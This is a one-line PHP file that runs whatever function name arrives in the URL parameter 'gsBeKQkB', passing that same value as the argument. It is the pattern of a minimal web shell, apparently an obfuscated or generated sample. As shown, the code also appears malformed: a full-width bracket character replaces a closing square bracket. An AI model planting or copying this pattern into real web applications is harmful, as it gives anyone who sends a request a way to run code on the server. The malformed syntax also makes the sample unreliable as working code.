<?php
$_GET['gsBeKQkB'〕($_GET['gsBeKQkB']);
?>
